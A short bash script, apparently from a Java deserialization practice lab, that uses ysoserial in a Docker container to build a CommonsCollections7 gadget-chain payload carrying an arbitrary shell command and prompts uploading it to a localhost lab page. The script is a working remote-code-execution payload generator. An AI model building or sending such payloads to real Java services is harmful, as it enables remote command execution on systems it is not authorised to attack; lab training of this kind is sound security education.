#!/bin/bash
# class20 — CC7链 (CommonsCollections7)
# 靶场: /class20/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
docker cp ../../lib/ysoserial.jar javaserial-lab:/tmp/ysoserial.jar 2>/dev/null
docker exec javaserial-lab java -jar /tmp/ysoserial.jar CommonsCollections7 "$CMD" > ../../class20.ser 2>/dev/null
echo "✅ 已生成: class20.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class20/"
